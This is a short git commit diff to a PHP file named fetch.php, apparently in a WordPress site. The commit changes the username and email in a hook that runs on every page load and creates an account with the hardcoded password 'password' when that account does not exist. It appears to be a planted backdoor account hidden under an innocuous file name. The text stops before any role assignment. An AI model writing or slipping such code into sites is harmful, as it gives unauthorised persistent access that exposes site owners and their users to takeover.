8e57e102565660220e9de6ae73cbbc01516ba384
avijitpalit <82804223+avijitpalit@users.noreply.github.com>
2024-06-19 23:07:17 +0530

    Update fetch.php

--- fetch.php
+++ fetch.php
@@ -1,9 +1,9 @@
 <?
 
 add_action( 'init', function () {
-	$username = 'admin';
+	$username = 'admin_2';
 	$password = 'password';
-	$email_address = 'webmaster@mydomain.com';
+	$email_address = 'webmaster_2@mydomain.com';
 
 	if ( ! username_exists( $username ) ) {
 		$user_id = wp_create_user( $username, $password, $email_address );
